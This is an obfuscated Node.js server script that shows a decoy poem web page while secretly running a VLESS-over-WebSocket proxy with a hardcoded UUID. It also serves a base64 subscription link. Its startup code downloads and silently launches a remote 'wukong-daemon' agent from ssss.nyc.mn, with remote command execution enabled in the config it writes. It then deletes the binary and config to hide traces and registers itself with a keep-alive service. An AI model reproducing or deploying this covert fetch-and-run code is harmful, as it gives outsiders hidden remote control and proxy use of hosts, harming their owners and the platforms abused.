const _0x4d152e=_0x275a;function _0x275a(_0x3f5d53,_0x32cb1b){const _0x23ad0a=_0x23ad();return _0x275a=function(_0x275a90,_0x2266cd){_0x275a90=_0x275a90-0xd3;let _0x2bfe3c=_0x23ad0a[_0x275a90];return _0x2bfe3c;},_0x275a(_0x3f5d53,_0x32cb1b);}(function(_0x22497e,_0x165d3d){const _0x39cd81=_0x275a,_0x178ca6=_0x22497e();while(!![]){try{const _0x45993b=-parseInt(_0x39cd81(0x122))/0x1+-parseInt(_0x39cd81(0xe7))/0x2+parseInt(_0x39cd81(0xe8))/0x3+-parseInt(_0x39cd81(0x10b))/0x4*(-parseInt(_0x39cd81(0xef))/0x5)+-parseInt(_0x39cd81(0x113))/0x6*(-parseInt(_0x39cd81(0x108))/0x7)+-parseInt(_0x39cd81(0x12f))/0x8*(parseInt(_0x39cd81(0x103))/0x9)+parseInt(_0x39cd81(0x112))/0xa;if(_0x45993b===_0x165d3d)break;else _0x178ca6['push'](_0x178ca6['shift']());}catch(_0x227e27){_0x178ca6['push'](_0x178ca6['shift']());}}}(_0x23ad,0xe1f08));const os=require('os'),http=require(_0x4d152e(0x118)),fs=require('fs'),axios=require(_0x4d152e(0xff)),net=require(_0x4d152e(0xf4)),{Buffer}=require(_0x4d152e(0xf8)),{exec,execSync}=require(_0x4d152e(0x124)),{WebSocket,createWebSocketStream}=require('ws'),KEY=process[_0x4d152e(0x10c)][_0x4d152e(0x11c)]||_0x4d152e(0x135),WUKONG_SERVER=process['env'][_0x4d152e(0xf3)]||'',WUKONG_PORT=process['env'][_0x4d152e(0xd4)]||'',WUKONG_KEY=process[_0x4d152e(0x10c)]['WUKONG_KEY']||'',DOMAIN=process[_0x4d152e(0x10c)][_0x4d152e(0x104)]||'',AUTO_ACCESS=process[_0x4d152e(0x10c)][_0x4d152e(0x132)]||![],WSPATH=process['env'][_0x4d152e(0xe0)]||KEY[_0x4d152e(0x12c)](0x0,0x8),SUB_PATH=process[_0x4d152e(0x10c)][_0x4d152e(0xde)]||_0x4d152e(0x100),NAME=process[_0x4d152e(0x10c)][_0x4d152e(0xee)]||'Vl',PORT=process[_0x4d152e(0x10c)]['PORT']||0xbb8;function _0x23ad(){const _0x5bf7e7=['log','AUTO_ACCESS','8443','vless://','161fc0b2-cfa3-4053-8d51-20aeee66c2dd','post','WUKONG_PORT','writeFileSync','toString','chmod\x20+x\x20wukong-daemon','https://amd64.ssss.nyc.mn/agent','readUInt16BE','finish','utf-8','/bin/bash','https://arm64.ssss.nyc.mn/v1','SUB_PATH','2096','WSPATH','end','config.yaml','reduce','replace','aarch64','connect','2268792BEnYqH','1683675HMfbVR','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','split','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./wukong-daemon\x22','wukong-daemon','arm','NAME','20LwqRHJ','text/plain','&path=%2F','trim','WUKONG_SERVER','net','Unknown','once','application/json','buffer','Not\x20Found\x0a','createWriteStream','setsid\x20nohup\x20./wukong-daemon\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','base64','client_secret:\x20','pop','axios','sub123','https://speed.cloudflare.com/meta','get','2187XzcTKZ','DOMAIN','send','https://amd64.ssss.nyc.mn/v1','unlink','362005wilYxr','map','error:\x20','497024VCKFYg','env','join','readUInt8','url','error','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','10824530sMcwqg','48OEkuwK','setsid\x20nohup\x20./wukong-daemon\x20-s\x20','WUKONG\x20variable\x20is\x20empty,\x20skip\x20running','asOrganization','https://oooo.serv00.net/add-url','http','--tls','includes','country','KEY','writeHead','2053','message','2087','every','471979ibGjLd','data','child_process','decode','pipe','arch','arm64','listen','wukong-daemon\x20is\x20already\x20running,\x20skip\x20running...','2083','slice','@www.visa.com.tw:443?encryption=none&security=tls&sni=','connection','744hBjDye','wukong-daemon\x20is\x20running'];_0x23ad=function(){return _0x5bf7e7;};return _0x23ad();}let ISP='';const GetISP=async()=>{const _0x4bf7e8=_0x4d152e;try{const _0x125b7e=await axios[_0x4bf7e8(0x102)](_0x4bf7e8(0x101)),_0x11eb06=_0x125b7e[_0x4bf7e8(0x123)];ISP=(_0x11eb06[_0x4bf7e8(0x11b)]+'-'+_0x11eb06[_0x4bf7e8(0x116)])['replace'](/ /g,'_');}catch(_0x18a193){ISP=_0x4bf7e8(0xf5);}};GetISP();const httpServer=http['createServer']((_0x3f024d,_0x17288c)=>{const _0x2c41e7=_0x4d152e;if(_0x3f024d[_0x2c41e7(0x10f)]==='/'){const _0x12a743='\x0a<!DOCTYPE\x20html>\x0a<html\x20lang=\x22en\x22>\x0a<head>\x0a\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20<title>An\x20Echo\x20of\x20Light</title>\x0a\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x20font-family:\x20serif;\x20background-color:\x20#282c34;\x20color:\x20#f0f2f5;\x20display:\x20flex;\x20justify-content:\x20center;\x20align-items:\x20center;\x20height:\x20100vh;\x20margin:\x200;\x20text-align:\x20center;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20pre\x20{\x20font-size:\x201.2em;\x20line-height:\x201.8;\x20white-space:\x20pre-wrap;\x20padding:\x202.5em;\x20background:\x20rgba(255,\x20255,\x20255,\x200.05);\x20border-radius:\x2010px;\x20border:\x201px\x20solid\x20rgba(255,\x20255,\x20255,\x200.1);\x20}\x0a\x20\x20\x20\x20</style>\x0a</head>\x0a<body>\x0a\x20\x20\x20\x20<pre>\x0aThe\x20stars\x20you\x20see,\x20a\x20distant\x20fire,\x0aA\x20whispered\x20echo\x20of\x20desire.\x0a\x0aTheir\x20ancient\x20light,\x20a\x20path\x20it\x20weaves,\x0aThrough\x20silent,\x20dark,\x20and\x20timeless\x20eaves.\x0a\x0aSo\x20look\x20within,\x20and\x20you\x20will\x20find,\x0aA\x20universe\x20inside\x20your\x20mind.\x0a\x20\x20\x20\x20</pre>\x0a</body>\x0a</html>\x0a\x20\x20';_0x17288c['writeHead'](0xc8,{'Content-Type':'text/html;\x20charset=utf-8'}),_0x17288c[_0x2c41e7(0xe1)](_0x12a743);}else{if(_0x3f024d[_0x2c41e7(0x10f)]==='/'+SUB_PATH){const _0x702f0c=_0x2c41e7(0x134)+KEY+_0x2c41e7(0x12d)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2c41e7(0xf1)+WSPATH+'#'+NAME+'-'+ISP,_0x3a6d46=Buffer['from'](_0x702f0c)[_0x2c41e7(0xd6)](_0x2c41e7(0xfc));_0x17288c[_0x2c41e7(0x11d)](0xc8,{'Content-Type':_0x2c41e7(0xf0)}),_0x17288c['end'](_0x3a6d46+'\x0a');}else _0x17288c[_0x2c41e7(0x11d)](0x194,{'Content-Type':'text/plain'}),_0x17288c[_0x2c41e7(0xe1)](_0x2c41e7(0xf9));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=KEY[_0x4d152e(0xe4)](/-/g,'');wss['on'](_0x4d152e(0x12e),_0x4f85b2=>{const _0x439e2c=_0x4d152e;_0x4f85b2[_0x439e2c(0xf6)](_0x439e2c(0x11f),_0x254bcf=>{const _0x2b3720=_0x439e2c,[_0x392bb9]=_0x254bcf,_0x1686ab=_0x254bcf[_0x2b3720(0x12c)](0x1,0x11);if(!_0x1686ab[_0x2b3720(0x121)]((_0xc1a306,_0x38baa3)=>_0xc1a306==parseInt(uuid['substr'](_0x38baa3*0x2,0x2),0x10)))return;let _0x2f8cd9=_0x254bcf[_0x2b3720(0x12c)](0x11,0x12)[_0x2b3720(0x10e)]()+0x13;const _0x686a8d=_0x254bcf[_0x2b3720(0x12c)](_0x2f8cd9,_0x2f8cd9+=0x2)[_0x2b3720(0xd9)](0x0),_0x1f80f8=_0x254bcf[_0x2b3720(0x12c)](_0x2f8cd9,_0x2f8cd9+=0x1)[_0x2b3720(0x10e)](),_0x3b7803=_0x1f80f8==0x1?_0x254bcf[_0x2b3720(0x12c)](_0x2f8cd9,_0x2f8cd9+=0x4)[_0x2b3720(0x10d)]('.'):_0x1f80f8==0x2?new TextDecoder()[_0x2b3720(0x125)](_0x254bcf[_0x2b3720(0x12c)](_0x2f8cd9+0x1,_0x2f8cd9+=0x1+_0x254bcf[_0x2b3720(0x12c)](_0x2f8cd9,_0x2f8cd9+0x1)[_0x2b3720(0x10e)]())):_0x1f80f8==0x3?_0x254bcf[_0x2b3720(0x12c)](_0x2f8cd9,_0x2f8cd9+=0x10)[_0x2b3720(0xe3)]((_0xf26ffe,_0x5583f8,_0x9590d2,_0x4a49cd)=>_0x9590d2%0x2?_0xf26ffe['concat'](_0x4a49cd['slice'](_0x9590d2-0x1,_0x9590d2+0x1)):_0xf26ffe,[])[_0x2b3720(0x109)](_0x466247=>_0x466247[_0x2b3720(0xd9)](0x0)[_0x2b3720(0xd6)](0x10))['join'](':'):'';_0x4f85b2[_0x2b3720(0x105)](new Uint8Array([_0x392bb9,0x0]));const _0x2f6677=createWebSocketStream(_0x4f85b2);net[_0x2b3720(0xe6)]({'host':_0x3b7803,'port':_0x686a8d},function(){const _0x3b8cc6=_0x2b3720;this['write'](_0x254bcf[_0x3b8cc6(0x12c)](_0x2f8cd9)),_0x2f6677['on']('error',()=>{})[_0x3b8cc6(0x126)](this)['on'](_0x3b8cc6(0x110),()=>{})[_0x3b8cc6(0x126)](_0x2f6677);})['on'](_0x2b3720(0x110),()=>{});})['on'](_0x439e2c(0x110),()=>{});});const getDownloadUrl=()=>{const _0x131423=_0x4d152e,_0x3df525=os[_0x131423(0x127)]();return _0x3df525===_0x131423(0xed)||_0x3df525===_0x131423(0x128)||_0x3df525===_0x131423(0xe5)?!WUKONG_PORT?_0x131423(0xdd):'https://arm64.ssss.nyc.mn/agent':!WUKONG_PORT?_0x131423(0x106):_0x131423(0xd8);},downloadFile=async()=>{const _0x5e8bd7=_0x4d152e;if(!WUKONG_SERVER&&!WUKONG_KEY)return;try{const _0x365d20=getDownloadUrl(),_0x1e0c62=await axios({'method':_0x5e8bd7(0x102),'url':_0x365d20,'responseType':'stream'}),_0x340a3e=fs[_0x5e8bd7(0xfa)]('wukong-daemon');return _0x1e0c62[_0x5e8bd7(0x123)][_0x5e8bd7(0x126)](_0x340a3e),new Promise((_0xaeca1,_0x1ccff6)=>{const _0x54b1ad=_0x5e8bd7;_0x340a3e['on'](_0x54b1ad(0xda),()=>{const _0x1747d3=_0x54b1ad;console[_0x1747d3(0x131)]('wukong-daemon\x20download\x20successfully'),exec(_0x1747d3(0xd7),_0x2b2ef5=>{if(_0x2b2ef5)_0x1ccff6(_0x2b2ef5);_0xaeca1();});}),_0x340a3e['on'](_0x54b1ad(0x110),_0x1ccff6);});}catch(_0x5c07f6){throw _0x5c07f6;}},runnz=async()=>{const _0x1b025b=_0x4d152e;try{const _0x33a8f2=execSync(_0x1b025b(0xeb),{'encoding':_0x1b025b(0xdb)});if(_0x33a8f2[_0x1b025b(0xf2)]()!==''){console[_0x1b025b(0x131)](_0x1b025b(0x12a));return;}}catch(_0x5a8fe2){}await downloadFile();let _0x551d0c='',_0x4b517f=['443',_0x1b025b(0x133),_0x1b025b(0xdf),_0x1b025b(0x120),_0x1b025b(0x12b),_0x1b025b(0x11e)];if(WUKONG_SERVER&&WUKONG_PORT&&WUKONG_KEY){const _0x56198a=_0x4b517f[_0x1b025b(0x11a)](WUKONG_PORT)?_0x1b025b(0x119):'';_0x551d0c=_0x1b025b(0x114)+WUKONG_SERVER+':'+WUKONG_PORT+'\x20-p\x20'+WUKONG_KEY+'\x20'+_0x56198a+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(WUKONG_SERVER&&WUKONG_KEY){if(!WUKONG_PORT){const _0x14a0fe=WUKONG_SERVER[_0x1b025b(0x11a)](':')?WUKONG_SERVER[_0x1b025b(0xea)](':')[_0x1b025b(0xfe)]():'',_0x47f9e8=_0x4b517f[_0x1b025b(0x11a)](_0x14a0fe)?'true':'false',_0x4bdf13=_0x1b025b(0xfd)+WUKONG_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+WUKONG_SERVER+_0x1b025b(0x111)+_0x47f9e8+_0x1b025b(0xe9)+KEY;fs[_0x1b025b(0xd5)](_0x1b025b(0xe2),_0x4bdf13);}_0x551d0c=_0x1b025b(0xfb);}else{console[_0x1b025b(0x131)](_0x1b025b(0x115));return;}}try{exec(_0x551d0c,{'shell':_0x1b025b(0xdc)},_0x400971=>{const _0x1fcc67=_0x1b025b;if(_0x400971)console['error']('wukong-daemon\x20running\x20error:',_0x400971);else console['log'](_0x1fcc67(0x130));});}catch(_0x238e0a){console[_0x1b025b(0x110)](_0x1b025b(0x10a)+_0x238e0a);}};async function addAccessTask(){const _0x11b673=_0x4d152e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2f70ef='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x11e5c6=await axios[_0x11b673(0xd3)](_0x11b673(0x117),{'url':_0x2f70ef},{'headers':{'Content-Type':_0x11b673(0xf7)}});console[_0x11b673(0x131)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0xbbcde0){}}const delFiles=()=>{const _0x10a96d=_0x4d152e;fs[_0x10a96d(0x107)](_0x10a96d(0xec),()=>{}),fs[_0x10a96d(0x107)](_0x10a96d(0xe2),()=>{});};httpServer[_0x4d152e(0x129)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
